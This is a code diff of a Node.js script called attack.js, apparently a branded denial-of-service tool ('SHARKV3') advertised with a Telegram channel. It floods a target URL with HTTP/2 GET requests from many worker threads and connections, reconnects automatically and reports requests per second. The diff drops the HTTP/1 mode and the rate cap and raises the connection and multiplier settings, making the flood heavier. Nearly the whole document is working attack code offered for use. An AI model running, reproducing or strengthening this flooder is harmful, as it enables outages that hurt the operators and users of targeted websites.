@@ -1,16 +1,14 @@
 const http2 = require('http2');
-const http = require('http');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
 const THREADS = 16;
-const INITIAL_CONNECTIONS = 20;
-const POWER_MULTIPLIER = 2;
-const WARMUP_TIME = 20000; // 20 seconds warmup
+const INITIAL_CONNECTIONS =30;
+const POWER_MULTIPLIER = 4;
+const WARMUP_TIME = 15000;
 const MAX_INFLIGHT = 2000;
-const MAX_RPS = 100000; // Adjust this depending on your needs
 
 let totalRequests = 0;
 let successCount = 0;
@@ -19,19 +17,13 @@ let maxRps = 0;
 let rpsLastSecond = 0;
 
 if (isMainThread) {
-    if (process.argv.length < 5) {
-        console.error('Usage: node attack.js <target> <duration_secs> <protocol (h1/h2)>');
+    if (process.argv.length < 4) {
+        console.error('Usage: node attack.js <target> <duration_secs>');
         process.exit(1);
     }
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
-    const protocol = process.argv[4].toLowerCase();
-
-    if (protocol !== 'h1' && protocol !== 'h2') {
-        console.error('Invalid protocol. Use "h1" or "h2".');
-        process.exit(1);
-    }
 
     console.clear();
     console.log(`Warming up... Starting attack in 5s`);
@@ -41,24 +33,15 @@ if (isMainThread) {
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
 
-        // Initial 5 seconds to start threads
         for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
+            new Worker(__filename, { workerData: { target, duration, initial: true } });
         }
 
-        // After 5s start full attack for 10s, then 10-20s rest phase
         setTimeout(() => {
             for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-                new Worker(__filename, { workerData: { target, duration, protocol, initial: false } });
+                new Worker(__filename, { workerData: { target, duration, initial: false } });
             }
-        }, 5000);
-
-        // Rest period after the full throttle (10s to 20s phase)
-        setTimeout(() => {
-            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-                new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
-            }
-        }, 15000);
+        }, WARMUP_TIME);
 
         // Live stats
         setInterval(() => {
@@ -66,7 +49,7 @@ if (isMainThread) {
             renderStats();
             rpsLastSecond = 0;
         }, 1000);
-    }, 5000);
+    }, WARMUP_TIME);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
@@ -95,7 +78,7 @@ if (isMainThread) {
     });
     server.listen(9999);
 } else {
-    const { target, duration, protocol, initial } = workerData;
+    const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
@@ -111,13 +94,8 @@ if (isMainThread) {
 
         try {
             inflight.count++;
-            let req;
-            if (protocol === 'h2') {
-                req = client.request({ ':path': '/', ':method': 'GET' });
-                req.setNoDelay?.(true);
-            } else {
-                req = http.request(target, { method: 'GET' });
-            }
+            const req = client.request({ ':path': '/', ':method': 'GET' });
+            req.setNoDelay?.(true);
             req.on('response', () => {
                 sendStat('ok');
                 inflight.count--;
@@ -139,12 +117,7 @@ if (isMainThread) {
     function createConnection() {
         let client;
         try {
-            if (protocol === 'h2') {
-                client = http2.connect(target);
-            } else {
-                client = http.request(target);
-            }
-
+            client = http2.connect(target);
             client.on('error', () => {});
             client.on('close', () => setTimeout(createConnection, 100));
             client.on('connect', () => {
